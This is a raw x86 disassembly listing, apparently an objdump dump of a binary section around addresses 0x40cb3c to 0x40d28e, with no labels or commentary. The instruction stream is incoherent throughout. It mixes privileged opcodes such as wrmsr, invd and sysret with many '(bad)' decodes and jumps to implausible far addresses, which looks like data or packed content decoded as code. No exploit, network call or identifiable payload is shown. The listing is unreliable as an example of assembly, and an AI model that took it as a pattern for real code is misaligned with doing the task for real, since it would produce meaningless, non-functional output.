  40cb3c:	dec    esi
  40cb3d:	mov    bl,0xec
  40cb3f:	test   eax,0xcf07fc67
  40cb44:	sahf   
  40cb45:	aad    0x7d
  40cb47:	sysret 
  40cb49:	ja     0x40cb05
  40cb4b:	dec    esi
  40cb4c:	test   al,0xa2
  40cb4e:	out    dx,al
  40cb4f:	push   es
  40cb50:	mov    ds:0xfd169271,al
  40cb55:	stos   BYTE PTR es:[edi],al
  40cb56:	daa    
  40cb57:	dec    edi
  40cb58:	adc    ch,BYTE PTR [ecx]
  40cb5a:	ja     0x40cafd
  40cb5c:	dec    ebx
  40cb5d:	pop    es
  40cb5e:	(bad)  
  40cb5f:	sub    dh,dl
  40cb61:	bound  esi,QWORD PTR [edx+0x36763a5e]
  40cb67:	xchg   esp,eax
  40cb68:	mov    eax,DWORD PTR [ecx+ecx*2-0x2b]
  40cb6c:	les    edi,FWORD PTR [ebx]
  40cb6e:	mov    al,ds:0xe99e7be6
  40cb73:	push   esp
  40cb74:	mov    DWORD PTR [esi],esi
  40cb76:	aas    
  40cb77:	xor    al,0xa4
  40cb79:	adc    ch,dh
  40cb7b:	dec    edi
  40cb7c:	(bad)  
  40cb7d:	(bad)  
  40cb7e:	adc    cl,BYTE PTR [edx+0x205a0bf7]
  40cb84:	pushf  
  40cb85:	test   al,0x62
  40cb87:	inc    edi
  40cb88:	out    dx,eax
  40cb89:	sahf   
  40cb8a:	fsubrp st(4),st
  40cb8c:	les    edx,FWORD PTR ds:0xca8b78fe
  40cb92:	enter  0x6e75,0x59
  40cb96:	leave  
  40cb97:	sti    
  40cb98:	xchg   ebp,eax
  40cb99:	movd   DWORD PTR [ecx],mm7
  40cb9c:	inc    edi
  40cb9d:	dec    esp
  40cb9e:	jo     0x40cb6c
  40cba0:	push   es
  40cba1:	or     eax,0x5f124e1f
  40cba6:	out    dx,eax
  40cba7:	ja     0x40cb71
  40cba9:	mov    ds:0xff0870a3,eax
  40cbae:	and    eax,ecx
  40cbb0:	xchg   edx,eax
  40cbb1:	mov    al,0x36
  40cbb3:	adc    DWORD PTR [esi-0x78],0xfffffff4
  40cbb7:	mov    esp,0xedf79308
  40cbbc:	aam    0x71
  40cbbe:	inc    esp
  40cbbf:	rol    DWORD PTR [esi],0x28
  40cbc2:	aaa    
  40cbc3:	mov    eax,fs
  40cbc5:	(bad)  
  40cbc6:	das    
  40cbc7:	gs sub eax,ebx
  40cbca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbcb:	mov    ah,0xcf
  40cbcd:	adc    eax,0xc70c8d2c
  40cbd2:	test   BYTE PTR [eax-0x27b90655],bl
  40cbd8:	mov    edi,0x59939fda
  40cbdd:	inc    esi
  40cbde:	mov    ch,0x20
  40cbe0:	cmp    al,0x7d
  40cbe2:	in     al,0x7
  40cbe4:	sbb    BYTE PTR [eax+ebp*8],dh
  40cbe7:	sbb    al,0xaa
  40cbe9:	jmp    0x40cc44
  40cbeb:	jbe    0x40cb95
  40cbed:	mov    BYTE PTR [ebx-0x1374f77],bl
  40cbf3:	pop    esi
  40cbf4:	or     BYTE PTR [ecx+esi*4+0x39c32acd],ah
  40cbfb:	pop    DWORD PTR [ebx+0x40]
  40cbfe:	outs   dx,DWORD PTR ds:[esi]
  40cbff:	in     al,dx
  40cc00:	add    DWORD PTR [ecx-0x3ad96413],edi
  40cc06:	sub    al,0x95
  40cc08:	xchg   edi,eax
  40cc09:	scas   eax,DWORD PTR es:[edi]
  40cc0a:	and    BYTE PTR [edi],ah
  40cc0c:	jns    0x40cbfd
  40cc0e:	and    al,0x25
  40cc10:	dec    edx
  40cc11:	mov    ecx,DWORD PTR [edx]
  40cc13:	rcl    DWORD PTR [eax-0x70c93cad],cl
  40cc19:	xor    cl,al
  40cc1b:	mov    ebp,0x4c39ce97
  40cc20:	outs   dx,DWORD PTR ds:[esi]
  40cc21:	mov    esp,DWORD PTR [ecx]
  40cc23:	cs out 0x75,al
  40cc26:	mov    ebx,0x495da46b
  40cc2b:	ret    
  40cc2c:	inc    esi
  40cc2d:	dec    edi
  40cc2e:	jecxz  0x40cc51
  40cc30:	push   0xffffffe8
  40cc32:	aas    
  40cc33:	mov    edx,0x38574180
  40cc38:	push   ss
  40cc39:	and    bl,BYTE PTR [eax-0x29]
  40cc3c:	fsub   QWORD PTR [eax+0x1a9d9abc]
  40cc42:	out    0xfb,al
  40cc44:	lahf   
  40cc45:	inc    edi
  40cc46:	add    al,0xd4
  40cc48:	add    BYTE PTR [ecx+0x3a791d52],bl
  40cc4e:	and    DWORD PTR [edi+0x79],0x5b13b97d
  40cc55:	fcomi  st,st(1)
  40cc57:	out    dx,al
  40cc58:	popf   
  40cc59:	jmp    0xc1a2d824
  40cc5e:	mov    eax,ds:0x60c1c229
  40cc63:	inc    edi
  40cc64:	test   BYTE PTR [ebp+0x24],bl
  40cc67:	ret    0x947c
  40cc6a:	clc    
  40cc6b:	cs ds js 0x40cc76
  40cc6f:	pop    esi
  40cc70:	dec    ebx
  40cc71:	cdq    
  40cc72:	aas    
  40cc73:	mov    BYTE PTR [ebx*8-0x26052d1a],cl
  40cc7a:	sbb    BYTE PTR [edi],bl
  40cc7c:	sbb    al,0xf9
  40cc7e:	daa    
  40cc7f:	(bad)  
  40cc80:	mov    BYTE PTR [esi+eax*4-0x78],dl
  40cc84:	push   esi
  40cc85:	ins    DWORD PTR es:[edi],dx
  40cc86:	xor    dl,BYTE PTR [ecx+0x1e]
  40cc89:	fsubrp st(4),st
  40cc8b:	cmp    ebx,ebp
  40cc8d:	push   ds
  40cc8e:	mov    ah,0x99
  40cc90:	int    0xe4
  40cc92:	sbb    cl,bh
  40cc94:	imul   esi,eax,0x7658acf9
  40cc9a:	add    eax,0xafc06edd
  40cc9f:	or     al,0xa8
  40cca1:	xchg   esp,eax
  40cca2:	lock bound edi,QWORD PTR [eax+0x23]
  40cca6:	and    DWORD PTR [ebx+0x7],0x68c06b50
  40ccad:	out    0x8d,al
  40ccaf:	inc    edx
  40ccb0:	sub    esp,edi
  40ccb2:	mov    al,ds:0x201a3f0f
  40ccb7:	pop    edi
  40ccb8:	pop    ss
  40ccb9:	fwait
  40ccba:	dec    edx
  40ccbb:	mov    al,0x4d
  40ccbd:	bound  ecx,QWORD PTR [edx]
  40ccbf:	shl    BYTE PTR [edi-0x7b3a0e5a],cl
  40ccc5:	sub    DWORD PTR [ebp-0x37218aff],edx
  40cccb:	add    DWORD PTR [ecx-0x72],0x2e
  40cccf:	mov    al,ds:0xc28018ae
  40ccd4:	add    ah,BYTE PTR [eax]
  40ccd6:	mov    dh,0xcb
  40ccd8:	bound  esp,QWORD PTR ds:0xf21b217f
  40ccde:	sbb    eax,0x961ceb01
  40cce3:	aas    
  40cce4:	mov    dl,0x13
  40cce6:	call   0xb093230f
  40cceb:	cmp    DWORD PTR [edx],0x1de046d2
  40ccf1:	push   es
  40ccf2:	jne    0x40cd24
  40ccf4:	imul   ebp,DWORD PTR [esi],0x2b
  40ccf7:	jno    0x40ccea
  40ccf9:	fcmove st,st(7)
  40ccfb:	jbe    0x40cd1a
  40ccfd:	addr16 pop ebx
  40ccff:	cld    
  40cd00:	dec    edi
  40cd01:	ins    BYTE PTR es:[edi],dx
  40cd02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd03:	or     dh,BYTE PTR [ecx-0x18]
  40cd06:	mov    bl,dh
  40cd08:	pop    esp
  40cd09:	mov    bh,BYTE PTR [ecx+0x5a87731a]
  40cd0f:	jne    0x40cd05
  40cd11:	leave  
  40cd12:	test   al,0xa4
  40cd14:	mov    dl,BYTE PTR [edi+0x1b2b31fe]
  40cd1a:	paddusb mm4,QWORD PTR [esi+0x281ecef7]
  40cd21:	mov    BYTE PTR [edx],bh
  40cd23:	mov    cl,0xb6
  40cd25:	ret    
  40cd26:	pop    esp
  40cd27:	test   DWORD PTR [esi-0x3f],edx
  40cd2a:	push   edi
  40cd2b:	es dec eax
  40cd2d:	out    0x4d,al
  40cd2f:	inc    ebp
  40cd30:	ins    DWORD PTR es:[edi],dx
  40cd31:	int    0x67
  40cd33:	jmp    0x30422e10
  40cd38:	aaa    
  40cd39:	in     al,0xc
  40cd3b:	aam    0x99
  40cd3d:	hlt    
  40cd3e:	jnp    0x40cd9a
  40cd40:	mov    esp,0x3780a297
  40cd45:	pop    ax
  40cd47:	pop    esi
  40cd48:	jle    0x40cdb6
  40cd4a:	or     al,0x6f
  40cd4c:	(bad)  
  40cd4d:	pop    ebp
  40cd4e:	test   al,0xb7
  40cd50:	leave  
  40cd51:	sbb    BYTE PTR [ecx-0x36],ah
  40cd54:	xor    cl,bh
  40cd56:	jp     0x40cd70
  40cd58:	push   es
  40cd59:	mov    al,ds:0xa0160c66
  40cd5e:	fld    DWORD PTR [ebx-0x4d]
  40cd61:	jb     0x40cd8e
  40cd63:	jmp    0xa074b466
  40cd68:	dec    ebx
  40cd69:	pop    ds
  40cd6a:	mov    eax,0xf3de1bbd
  40cd6f:	js     0x40cd44
  40cd71:	hlt    
  40cd72:	xchg   esi,eax
  40cd73:	jmp    0x40cd9b
  40cd75:	mov    esi,0x5f9c6f8b
  40cd7a:	js     0x40cd55
  40cd7c:	in     al,dx
  40cd7d:	jge    0x40cddf
  40cd7f:	imul   ebp,DWORD PTR ds:0xad5cac04,0x3eb88c81
  40cd89:	aas    
  40cd8a:	cmp    eax,0x9750f53d
  40cd8f:	inc    ecx
  40cd90:	adc    DWORD PTR [ebp+0x37],0x99890e05
  40cd97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd98:	lds    ebx,FWORD PTR [ebx-0x27a9e335]
  40cd9e:	pop    edx
  40cd9f:	jecxz  0x40cda2
  40cda1:	add    DWORD PTR [ecx-0x3d],0x745b8d05
  40cda8:	add    eax,0x86dd0175
  40cdad:	jg     0x40cddd
  40cdaf:	in     eax,0xab
  40cdb1:	push   ds
  40cdb2:	pop    ecx
  40cdb3:	and    esp,DWORD PTR [ecx-0x530a4111]
  40cdb9:	in     al,0x30
  40cdbb:	in     al,0x39
  40cdbd:	es inc eax
  40cdbf:	mov    esi,0x96b9b0f5
  40cdc4:	and    eax,0xf894603f
  40cdc9:	dec    eax
  40cdca:	push   0x84f72d04
  40cdcf:	and    DWORD PTR [edx],edi
  40cdd1:	mov    esi,0xdf4975d7
  40cdd6:	add    cl,bh
  40cdd8:	adc    ch,al
  40cdda:	icebp  
  40cddb:	pop    esi
  40cddc:	sahf   
  40cddd:	popa   
  40cdde:	jmp    0x40cdc4
  40cde0:	in     eax,dx
  40cde1:	sub    BYTE PTR [ebp+0x66601320],bh
  40cde7:	loope  0x40ce4f
  40cde9:	xchg   edx,eax
  40cdea:	adc    DWORD PTR [edx-0x741d9ca8],edi
  40cdf0:	mov    bl,0x53
  40cdf2:	cmp    dl,cl
  40cdf4:	sub    al,bh
  40cdf6:	loopne 0x40cdb4
  40cdf8:	dec    ecx
  40cdf9:	push   0xcef386b3
  40cdfe:	(bad)  
  40cdff:	retf   
  40ce00:	mov    dh,0xe0
  40ce02:	jl     0x40ce1d
  40ce04:	adc    eax,0x74bd677f
  40ce09:	and    ebx,edi
  40ce0b:	push   0x10
  40ce0d:	or     dh,BYTE PTR [edi-0x22b5ac7b]
  40ce13:	out    dx,eax
  40ce14:	or     bh,cl
  40ce16:	jmp    0x3cf9:0xd23a791b
  40ce1d:	mov    dh,0xb6
  40ce1f:	jecxz  0x40ce3c
  40ce21:	loopne 0x40ce27
  40ce23:	mov    edx,0x6a9db2eb
  40ce28:	sub    cl,bh
  40ce2a:	inc    ebx
  40ce2b:	cmp    bl,BYTE PTR [ebx-0x4c4d627b]
  40ce31:	inc    ecx
  40ce32:	sub    al,0x60
  40ce34:	pusha  
  40ce35:	lea    edx,[edx+0x770f0df9]
  40ce3b:	mov    ebx,0xf9472bc5
  40ce40:	jae    0x40ce2e
  40ce42:	lds    eax,FWORD PTR [esi-0x1]
  40ce45:	or     eax,0xe1ebfaa2
  40ce4a:	sar    DWORD PTR [edi+0x30],0x7
  40ce4e:	add    BYTE PTR [ecx+0x1f],ch
  40ce51:	mov    bl,0xab
  40ce53:	sbb    al,0x6b
  40ce55:	imul   esi,ecx,0xed62984b
  40ce5b:	jne    0x40cea4
  40ce5d:	pop    ds
  40ce5e:	stos   DWORD PTR es:[edi],eax
  40ce5f:	push   ebx
  40ce60:	outs   dx,BYTE PTR ds:[esi]
  40ce61:	test   DWORD PTR [eax-0x334a9831],esp
  40ce67:	lds    edi,FWORD PTR [edx+eax*4+0x32]
  40ce6b:	adc    eax,0xfcb79d2
  40ce70:	ror    DWORD PTR [edi+0x14118606],1
  40ce76:	sub    ebp,DWORD PTR [esi-0x17]
  40ce79:	jl     0x40cebf
  40ce7b:	inc    esp
  40ce7c:	call   0x9502:0x4c0c1f14
  40ce83:	xchg   edx,eax
  40ce84:	(bad)  
  40ce85:	(bad)  
  40ce86:	pop    ebx
  40ce87:	dec    edi
  40ce88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce89:	scas   al,BYTE PTR es:[di]
  40ce8b:	es cmc 
  40ce8d:	aaa    
  40ce8e:	or     eax,0x5c876123
  40ce93:	pop    ds
  40ce94:	jl     0x40ce39
  40ce96:	xchg   esp,eax
  40ce97:	and    cl,cl
  40ce99:	pop    ebx
  40ce9a:	dec    esp
  40ce9b:	arpl   bp,di
  40ce9d:	out    dx,al
  40ce9e:	and    BYTE PTR [ebp*1+0x5d3d56cc],bl
  40cea5:	wrmsr  
  40cea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cea8:	jns    0x40ce4c
  40ceaa:	sub    al,0xd
  40ceac:	xchg   ebp,eax
  40cead:	add    DWORD PTR [ebx],edi
  40ceaf:	jl     0x40cea2
  40ceb1:	les    esi,FWORD PTR [esi+0x1d0f2dfa]
  40ceb7:	pop    eax
  40ceb8:	mov    al,ds:0x38285190
  40cebd:	(bad)  
  40cebe:	add    eax,0x9fdc6372
  40cec3:	push   ds
  40cec4:	retf   
  40cec5:	fmul   DWORD PTR [ebx]
  40cec7:	add    eax,0xaefbd29a
  40cecc:	mov    bl,0xf2
  40cece:	jl     0x40ce9a
  40ced0:	ss ret 
  40ced2:	push   esp
  40ced3:	and    eax,DWORD PTR [eax]
  40ced5:	pop    ds
  40ced6:	sub    DWORD PTR [edi-0x7e],ebx
  40ced9:	arpl   WORD PTR gs:[edi-0x5c],sp
  40cedd:	inc    esi
  40cede:	xor    bh,BYTE PTR [ebp-0x75]
  40cee1:	and    DWORD PTR [ecx+0xe],esp
  40cee4:	aaa    
  40cee5:	xor    eax,0xba8cfdcf
  40ceea:	mov    dh,0x4f
  40ceec:	out    dx,al
  40ceed:	adc    eax,0x8c4c145a
  40cef2:	lahf   
  40cef3:	or     BYTE PTR [ebx+0x37],dl
  40cef6:	jns    0x40cecd
  40cef8:	(bad)  
  40cef9:	call   0x292e3478
  40cefe:	push   eax
  40ceff:	das    
  40cf00:	arpl   dx,bx
  40cf02:	mov    gs,WORD PTR [edi+0x6f]
  40cf05:	retf   
  40cf06:	mov    ds:0xc95c62c5,al
  40cf0b:	hlt    
  40cf0c:	invd   
  40cf0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf0f:	xor    DWORD PTR [edx],esi
  40cf11:	fwait
  40cf12:	xchg   esi,eax
  40cf13:	in     al,0xe7
  40cf15:	ds jle 0x40cebc
  40cf18:	lods   eax,DWORD PTR ds:[esi]
  40cf19:	jmp    0x40cf45
  40cf1b:	dec    BYTE PTR [ecx+eax*4-0x57]
  40cf1f:	inc    esp
  40cf20:	push   0xd35a4dbf
  40cf25:	and    cl,BYTE PTR [ecx+0x10]
  40cf28:	lea    ecx,[eax+0x5]
  40cf2b:	loope  0x40cf8f
  40cf2d:	dec    esp
  40cf2e:	push   ebx
  40cf2f:	and    edx,edx
  40cf31:	icebp  
  40cf32:	cmp    dl,BYTE PTR [ebx+eiz*4+0x14541e29]
  40cf39:	xlat   BYTE PTR ds:[ebx]
  40cf3a:	and    eax,0xae552de8
  40cf3f:	pop    ss
  40cf40:	pop    ds
  40cf41:	push   eax
  40cf42:	sti    
  40cf43:	imul   DWORD PTR [esi-0x71]
  40cf46:	sub    edi,ecx
  40cf48:	fist   WORD PTR [ebp+0x65e123d]
  40cf4e:	dec    esi
  40cf4f:	cmp    esi,0x9655773
  40cf55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf57:	lock mov esi,0x941d885e
  40cf5d:	xchg   ebx,eax
  40cf5e:	sbb    al,0xb7
  40cf60:	mov    esp,0x204cab0f
  40cf65:	gs mov al,0x2a
  40cf68:	mov    al,ds:0x3337171d
  40cf6d:	cdq    
  40cf6e:	rcl    BYTE PTR fs:[edi],0x1
  40cf72:	mov    ebx,0x219eada9
  40cf77:	mov    ss:0x3239b4ae,eax
  40cf7d:	jbe    0x40cff3
  40cf7f:	outs   dx,DWORD PTR ds:[esi]
  40cf80:	add    al,0xce
  40cf82:	push   ss
  40cf83:	jae    0x40cf75
  40cf85:	pop    ss
  40cf86:	or     al,0x69
  40cf88:	fisttp QWORD PTR [edx-0x3d04686d]
  40cf8e:	lock shl BYTE PTR [esi],0xb8
  40cf92:	inc    ecx
  40cf93:	rcl    BYTE PTR [ebx+0x83ce476],1
  40cf99:	pop    edx
  40cf9a:	test   al,0x6b
  40cf9c:	int3   
  40cf9d:	jle    0x40cf6b
  40cf9f:	sbb    eax,0x9c0cc39d
  40cfa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfa5:	dec    ebp
  40cfa6:	xchg   esp,eax
  40cfa7:	int3   
  40cfa8:	imul   edi,DWORD PTR [ebp+0x19],0x70a37f38
  40cfaf:	dec    ebp
  40cfb0:	(bad)  
  40cfb2:	addr16 (bad) 
  40cfb4:	(bad)  
  40cfb5:	clc    
  40cfb6:	out    0x26,eax
  40cfb8:	xchg   edx,eax
  40cfb9:	prefetchwt1 (bad)
  40cfba:	or     eax,0xb2ac08d1
  40cfbf:	jo     0x40cfdf
  40cfc1:	and    eax,0xdba21161
  40cfc6:	scas   eax,DWORD PTR es:[edi]
  40cfc7:	mov    ebx,0x42647947
  40cfcc:	shr    DWORD PTR [ebx-0x5af442a8],cl
  40cfd2:	and    al,BYTE PTR [edi-0x33]
  40cfd5:	mov    ecx,0xf31e1b6d
  40cfda:	int    0xf6
  40cfdc:	mov    esi,es
  40cfde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfdf:	inc    ebx
  40cfe0:	pop    ecx
  40cfe1:	xchg   ebp,eax
  40cfe2:	inc    ebx
  40cfe3:	push   cs
  40cfe4:	push   esi
  40cfe5:	loope  0x40d051
  40cfe7:	xchg   ebp,eax
  40cfe8:	mov    WORD PTR [edi+0xe],es
  40cfeb:	add    eax,0x8d9b2cc9
  40cff0:	jns    0x40cfe3
  40cff2:	mov    ebp,0x2fd10d24
  40cff7:	iret   
  40cff8:	jmp    0xbc304cd8
  40cffd:	jns    0x40cfcc
  40cfff:	pusha  
  40d000:	pop    edi
  40d001:	mov    DWORD PTR [eax-0x44],0x88f9488
  40d008:	mov    bh,0xea
  40d00a:	sub    BYTE PTR [ebp+edx*1-0x44a77999],0x98
  40d012:	push   ebx
  40d013:	gs aas 
  40d015:	and    DWORD PTR [edx],esi
  40d017:	ss stos DWORD PTR es:[edi],eax
  40d019:	ins    BYTE PTR es:[edi],dx
  40d01a:	pop    ecx
  40d01b:	jne    0x40d093
  40d01d:	inc    ecx
  40d01e:	adc    eax,0xbae57453
  40d023:	add    eax,0x7870ad85
  40d028:	dec    esp
  40d029:	nop
  40d02a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d02b:	scas   al,BYTE PTR es:[edi]
  40d02c:	jae    0x40d080
  40d02e:	call   0x613f8dbe
  40d033:	and    cl,dl
  40d035:	into   
  40d036:	mov    edx,0xc8620bed
  40d03b:	add    edi,ebx
  40d03d:	jmp    0xe1c34662
  40d042:	or     esp,edx
  40d044:	cmp    BYTE PTR [ebp+0x2c],cl
  40d047:	or     DWORD PTR [ecx+0x1efaaeb5],edx
  40d04d:	sbb    bl,dh
  40d04f:	aas    
  40d050:	fwait
  40d051:	pop    esi
  40d052:	iret   
  40d053:	jb     0x40d078
  40d055:	cmc    
  40d056:	fdiv   QWORD PTR [edi-0x57]
  40d059:	fwait
  40d05a:	pushf  
  40d05b:	int3   
  40d05c:	pushf  
  40d05d:	stos   DWORD PTR es:[edi],eax
  40d05e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d060:	sub    ch,BYTE PTR [eax]
  40d062:	push   ebx
  40d063:	les    edi,FWORD PTR [ecx+0x63]
  40d066:	inc    esp
  40d067:	es fdivp st(4),st
  40d06a:	pop    ss
  40d06b:	ftst   
  40d06d:	xor    bl,BYTE PTR [edx-0x2]
  40d070:	popa   
  40d071:	lods   eax,DWORD PTR ds:[esi]
  40d072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d073:	into   
  40d074:	sbb    al,0x30
  40d076:	fdiv   DWORD PTR [ebp-0x19191bc9]
  40d07c:	test   eax,0x4eb189ad
  40d081:	jnp    0x40d027
  40d083:	push   ecx
  40d084:	sbb    eax,0x19dc225d
  40d089:	stos   BYTE PTR es:[edi],al
  40d08a:	mov    ch,0x72
  40d08c:	ins    DWORD PTR es:[edi],dx
  40d08d:	imul   ecx,DWORD PTR [ebx+0x5192ab51],0x62e9bf95
  40d097:	loopne 0x40d064
  40d099:	jnp    0x40d10b
  40d09b:	adc    bl,BYTE PTR [edx+0x55]
  40d09e:	or     eax,0x2703d727
  40d0a3:	push   eax
  40d0a4:	mov    ds:0x7a43f6db,eax
  40d0a9:	sub    eax,0x309df973
  40d0ae:	mov    dh,0xd8
  40d0b0:	and    al,0xc
  40d0b2:	mov    ds:0xc847ddae,eax
  40d0b7:	cwde   
  40d0b8:	int3   
  40d0b9:	and    edx,ebx
  40d0bb:	sbb    al,bl
  40d0bd:	push   edi
  40d0be:	fst    st(7)
  40d0c0:	pop    ebp
  40d0c1:	test   BYTE PTR [ebp-0x11],0x10
  40d0c5:	jl     0x40d079
  40d0c7:	cmp    edi,esi
  40d0c9:	pop    edx
  40d0ca:	aam    0x8e
  40d0cc:	xchg   esp,eax
  40d0cd:	dec    ecx
  40d0ce:	ss mov al,0x69
  40d0d1:	in     al,dx
  40d0d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0d3:	mov    gs,WORD PTR [esp+ebp*8+0x57]
  40d0d7:	jne    0x40d05f
  40d0d9:	dec    esp
  40d0da:	adc    al,0x4c
  40d0dc:	mov    ecx,0x9adc3d54
  40d0e1:	pop    esi
  40d0e2:	iret   
  40d0e3:	pop    edi
  40d0e4:	jno    0x40d089
  40d0e6:	les    esp,FWORD PTR [ebp-0x75]
  40d0e9:	xlat   BYTE PTR ds:[ebx]
  40d0ea:	lahf   
  40d0eb:	pushf  
  40d0ec:	push   ebx
  40d0ed:	or     bl,ch
  40d0ef:	popf   
  40d0f0:	xchg   edx,eax
  40d0f1:	es inc ebp
  40d0f3:	xlat   BYTE PTR ds:[ebx]
  40d0f4:	jno    0x40d14d
  40d0f6:	aad    0x5e
  40d0f8:	cli    
  40d0f9:	dec    eax
  40d0fa:	or     bl,BYTE PTR es:[edx]
  40d0fd:	(bad)  
  40d0fe:	pusha  
  40d0ff:	xchg   DWORD PTR fs:[ecx],edi
  40d102:	jle    0x40d160
  40d104:	in     al,0xfa
  40d106:	leave  
  40d107:	sti    
  40d108:	xchg   DWORD PTR [ebx+0x40d056f3],ebp
  40d10e:	xchg   esi,eax
  40d10f:	je     0xc12a9bfd
  40d115:	mov    bl,0xee
  40d117:	push   ebp
  40d118:	ret    0xabbc
  40d11b:	test   eax,0x13481fde
  40d120:	add    DWORD PTR ss:[eax-0x2774b2b],esp
  40d127:	loop   0x40d0e8
  40d129:	out    0xf5,eax
  40d12b:	lods   al,BYTE PTR ds:[esi]
  40d12c:	jmp    0xe027fdb
  40d131:	push   ebp
  40d132:	push   eax
  40d133:	(bad)  
  40d134:	mov    ecx,0xaf557c10
  40d139:	gs pop esp
  40d13b:	std    
  40d13c:	clc    
  40d13d:	jo     0x40d161
  40d13f:	add    eax,0x908c5cfe
  40d144:	xchg   ebp,eax
  40d145:	jmp    0x40d0f9
  40d147:	ds push ss
  40d149:	lods   al,BYTE PTR ds:[esi]
  40d14a:	lods   al,BYTE PTR ds:[esi]
  40d14b:	or     eax,0xa7a4f9f8
  40d150:	psubq  mm5,QWORD PTR [esi]
  40d153:	jo     0x40d150
  40d155:	loope  0x40d1d6
  40d157:	popa   
  40d158:	pusha  
  40d159:	or     BYTE PTR [ebp+0x68],dh
  40d15c:	inc    eax
  40d15d:	ss adc eax,0x56161027
  40d163:	add    ch,BYTE PTR [ecx-0x23bd5e45]
  40d169:	mov    dl,0x87
  40d16b:	call   0xf865:0x274a66d2
  40d172:	cli    
  40d173:	push   es
  40d174:	aas    
  40d175:	cmp    ebx,DWORD PTR [esi-0x65]
  40d178:	imul   ebp,DWORD PTR [esi-0x7a],0xffffffc6
  40d17c:	icebp  
  40d17d:	es mov esi,0xe66f9752
  40d183:	inc    ebx
  40d184:	mov    bl,0xea
  40d186:	cmp    al,0xae
  40d188:	dec    esp
  40d189:	stos   BYTE PTR es:[edi],al
  40d18a:	mov    esp,0xbe0df726
  40d18f:	cmp    eax,0x6eb86dd1
  40d194:	mov    al,0xf4
  40d196:	or     al,0xc8
  40d198:	std    
  40d199:	push   ebx
  40d19a:	push   cs
  40d19b:	sub    bh,BYTE PTR [edx]
  40d19d:	cwde   
  40d19e:	fld    QWORD PTR [edx]
  40d1a0:	psraw  mm5,mm5
  40d1a3:	xchg   edi,eax
  40d1a4:	mov    dl,0x83
  40d1a6:	lahf   
  40d1a7:	jp     0x40d152
  40d1a9:	loopne 0x40d1ba
  40d1ab:	ins    BYTE PTR es:[edi],dx
  40d1ac:	mul    BYTE PTR [edi+0x45]
  40d1af:	cmp    al,0xc8
  40d1b1:	aad    0x64
  40d1b3:	jo     0x40d1df
  40d1b5:	cld    
  40d1b6:	push   ss
  40d1b7:	call   esi
  40d1b9:	mov    ds:0xb07f6062,eax
  40d1be:	sar    ebx,1
  40d1c0:	jne    0x40d23c
  40d1c2:	jb     0x40d1a5
  40d1c4:	popf   
  40d1c5:	addr16 (bad) 
  40d1c7:	rcl    bl,0xb3
  40d1ca:	mov    cs,edi
  40d1cc:	cmp    ch,dl
  40d1ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1cf:	sahf   
  40d1d0:	std    
  40d1d1:	cmp    DWORD PTR [edi-0x43],0x37e50fd
  40d1d8:	stos   DWORD PTR es:[edi],eax
  40d1d9:	and    BYTE PTR [esi-0x73],dl
  40d1dc:	jae    0x40d227
  40d1de:	adc    esp,DWORD PTR [eax-0x6c7fbedb]
  40d1e4:	lds    edi,FWORD PTR [ebp+0xb]
  40d1e7:	leave  
  40d1e8:	pusha  
  40d1e9:	cmp    dl,BYTE PTR [edx+0x8]
  40d1ec:	sbb    BYTE PTR ds:0x58095a53,dh
  40d1f2:	jmp    0x40d1e2
  40d1f4:	sbb    eax,eax
  40d1f6:	shr    DWORD PTR [edx+0x6b5e275f],0xf3
  40d1fd:	push   cs
  40d1fe:	adc    bl,BYTE PTR [edi-0x7b]
  40d201:	or     BYTE PTR [ecx-0x65e2fc3c],ch
  40d207:	js     0x40d227
  40d209:	cmp    al,0xf0
  40d20b:	pop    esi
  40d20c:	and    ecx,DWORD PTR [edx+esi*2-0x44]
  40d210:	stos   BYTE PTR es:[edi],al
  40d211:	mov    ebx,0x7fda3497
  40d216:	stos   DWORD PTR es:[edi],eax
  40d217:	mov    esi,0xff51b53e
  40d21c:	sti    
  40d21d:	pop    DWORD PTR [edx-0x5ddc3d76]
  40d223:	xchg   edi,eax
  40d224:	xchg   ebp,eax
  40d225:	add    ecx,ebx
  40d227:	or     bh,BYTE PTR [ebp-0x52]
  40d22a:	xor    al,0xf4
  40d22c:	es jmp 0x467b376d
  40d232:	loope  0x40d1e3
  40d234:	ret    0x23bd
  40d237:	shl    esi,0x74
  40d23a:	xchg   edi,eax
  40d23b:	and    ebx,eax
  40d23d:	or     cx,si
  40d240:	in     al,dx
  40d241:	jl     0x40d2bb
  40d243:	pusha  
  40d244:	sbb    al,0x89
  40d246:	stos   DWORD PTR es:[edi],eax
  40d247:	daa    
  40d248:	inc    ebx
  40d249:	dec    eax
  40d24a:	popa   
  40d24b:	xlat   BYTE PTR ds:[bx]
  40d24d:	(bad)  
  40d24e:	retf   0xdb7a
  40d251:	aad    0x47
  40d253:	retf   0xaa71
  40d256:	(bad)  
  40d257:	cmc    
  40d258:	push   ss
  40d259:	push   ds
  40d25a:	sti    
  40d25b:	mov    WORD PTR [ebp-0x1a6c3520],gs
  40d261:	out    dx,eax
  40d262:	rol    DWORD PTR [esi-0x43dcd8a6],1
  40d268:	push   es
  40d269:	or     eax,0xa33a0899
  40d26e:	sub    DWORD PTR [ecx+0x33],eax
  40d271:	in     al,0x9f
  40d273:	bound  ecx,QWORD PTR [eax+eiz*4-0x4b]
  40d277:	jecxz  0x40d241
  40d279:	popf   
  40d27a:	xor    ah,BYTE PTR [ecx]
  40d27c:	push   esi
  40d27d:	jns    0x40d256
  40d27f:	aaa    
  40d280:	sub    DWORD PTR [esi+eiz*2+0x54],0xedaec3eb
  40d288:	test   BYTE PTR [ebx-0x66c8895e],ch
  40d28e:	adc    DWORD PTR [ecx+0x78],0xfffffffd
